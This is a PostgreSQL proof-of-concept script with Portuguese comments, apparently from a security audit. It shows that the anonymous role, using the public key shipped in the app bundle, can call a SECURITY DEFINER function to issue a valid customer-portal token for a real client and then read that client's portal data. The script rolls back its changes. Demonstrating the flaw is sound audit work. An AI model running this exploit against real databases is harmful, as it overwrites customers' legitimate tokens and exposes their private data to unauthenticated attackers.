-- PROVA C3-01 — anon emite token de Portal do Cliente sem autorização nenhuma.
-- Termina em RAISE EXCEPTION: o token gerado é SEMPRE descartado e o token
-- legítimo do cliente permanece intacto.
BEGIN;

-- Passo 0 (como postgres): escolhe um cliente real como alvo e guarda em GUCs.
SELECT set_config('poc.client_id',  (SELECT id::text            FROM clients ORDER BY id LIMIT 1), true);
SELECT set_config('poc.client_nome',(SELECT coalesce(name,'?')  FROM clients ORDER BY id LIMIT 1), true);
SELECT set_config('poc.org_id',     (SELECT organization_id::text FROM clients ORDER BY id LIMIT 1), true);

-- A partir daqui: papel anon — exatamente o que a chave publicada no bundle concede.
SET LOCAL ROLE anon;
SET LOCAL request.jwt.claims = '{"role":"anon"}';

DO $$
DECLARE
    v_client   uuid := current_setting('poc.client_id')::uuid;
    v_nome     text := current_setting('poc.client_nome');
    v_org      uuid := nullif(current_setting('poc.org_id'), '')::uuid;
    v_token_antes text;
    v_token_novo  text;
    v_pode_ler_clients int;
    v_dados_portal     text;
BEGIN
    -- Sem o ataque, anon não enxerga a tabela clients (RLS funcionando).
    SELECT count(*) INTO v_pode_ler_clients FROM clients WHERE id = v_client;

    SELECT token INTO v_token_antes FROM client_portal_tokens WHERE client_id = v_client;

    -- O ATAQUE: anon chama a RPC SECURITY DEFINER e recebe credencial válida.
    v_token_novo := client_portal_generate_token(v_client, v_org);

    -- E a credencial funciona: outra RPC anon devolve os dados do portal.
    BEGIN
        SELECT left(client_portal_get_data(v_token_novo)::text, 220)
          INTO v_dados_portal;
    EXCEPTION WHEN OTHERS THEN
        v_dados_portal := '(erro ao ler: ' || SQLERRM || ')';
    END;

    RAISE EXCEPTION E'\n=== PROVA C3-01 (transacao abortada, token descartado) ===\n'
        'Ator: papel anon (chave publica do bundle), SEM login\n'
        'Cliente alvo..........: % (%)\n'
        'Linhas de clients que anon consegue ler diretamente: %  <- RLS OK\n'
        'client_portal_generate_token(...) executou? SIM\n'
        '  token antes do ataque: %\n'
        '  token emitido p/ anon: %   <- sobrescreveria o legitimo\n'
        'client_portal_get_data(token) devolveu:\n%',
        v_nome, v_client, v_pode_ler_clients,
        coalesce(v_token_antes, '(nao havia)'), v_token_novo,
        coalesce(v_dados_portal, '(null)');
END $$;

ROLLBACK;
